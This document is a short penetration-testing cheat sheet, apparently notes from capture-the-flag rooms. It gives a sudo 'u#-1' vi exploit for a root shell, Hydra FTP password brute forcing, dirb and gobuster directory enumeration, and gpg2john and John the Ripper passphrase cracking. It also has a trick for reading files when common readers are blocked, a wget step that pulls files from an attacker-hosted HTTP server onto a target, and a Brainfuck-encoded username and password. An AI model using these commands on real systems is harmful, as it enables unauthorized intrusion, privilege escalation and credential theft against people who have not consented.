# Vi editor and sudo vulnerability

- Type:
````shell
sudo -u#-1 /usr/bin/vi file
````
- Then type on the vi finder menu: `!/bin/sh`

# Brainfuck coding language
- An example:
````brainfuck
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <

## Equivalent to: 
User: eli
Password: DSpDiM1wAEwid
````
- Decoder/Encoder here: https://www.dcode.fr/brainfuck-language

# Hydra by ftp
````shell
hydra -l user -P passwords.txt ftp://<target-ip>
````

# Dirb basic command
````shell
dirb http://10.10.233.35/ /usr/share/wordlists/dirb/common.txt 
````

# Gobuster basic command
````shell
gobuster dir -u http://10.10.70.124/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 60
````

# Tac for print and read files
- Use the tool tac for printing files when cat, vi, vim... are blocked or not permitted:
````shell
tac /home/file.txt
````

# Import a .asc key
- Once you get the key:
````shell
gpg --import key.asc

# If you don't have the creds, you can brute force it using gpg2john
gpg2john key.asc > hash.txt
# Then you crack it with john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Now you do the import step, introduce the creds and after that do the decrypt step
gpg --decrypt credential.pgp
````

# Python3 remote http server
- Initiate it: `python3 -m http.server 8080`
- The on the target machine:
````shell
wget http://<attack-ip>:8080/file
````

# Login without password to FTP
- User:  `anonymous`

